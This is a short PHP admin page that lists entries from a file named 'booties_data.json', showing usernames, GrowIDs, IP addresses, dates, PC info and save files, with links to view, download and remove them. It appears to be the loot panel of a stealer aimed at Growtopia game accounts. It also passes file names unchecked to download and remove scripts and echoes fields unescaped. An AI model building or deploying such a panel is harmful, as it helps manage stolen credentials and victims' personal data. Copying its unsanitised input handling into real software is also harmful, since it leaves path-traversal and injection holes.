<?php

    require("files/verified.php");
    include("header.php");
	
    $saveinfo = json_decode(file_get_contents("files/booties_data.json"));

	echo ("<table id='t01'>
		<col width='80'>
		<col width='200'>
		<col width='200'>
		<col width='200'>
		<col width='200'>
		<col width='150'>
		<col width='150'>
		<col width='150'>
		<col width='150'>
    
	<tr>
		<th>No.</th>
		<th>Username</th>
		<th>GrowID</th>
		<th>IP</th>
		<th>Date</th>
		<th>Save Info</th>
		<th>PC Info</th>
		<th>Save Data</th>
		<th>File Option</th>
	</tr>");

    $count = 0;
	
    foreach ($saveinfo as &$myObj)
	{
        $count +=1;
        echo "<tr><td>".$count."</td>";
        echo "<td><font color='yellow'>".$myObj->username."</font></td>";
         echo "<td><font color='yellow'>".$myObj->gid."</font></td>";
        echo "<td><font color='yellow'>".$myObj->ip."</font></td>";
        echo "<td><font color='yellow'>".date("m.d.Y H:i:s", $myObj->time)."</font></td>";
        echo '<td><a href="file_decode.php?file='.$myObj->save.'">View</a></td>';
		echo '<td><a href="file_info.php?file='.$myObj->info.'">View</a></td>';
		echo '<td><a href="download.php?file='.$myObj->save.'">Download</a></td>';
		echo '<td><a href="remove.php?file='.$myObj->save.'">Remove</a></td></tr>';
    }
    
    echo "</table>";
	
?>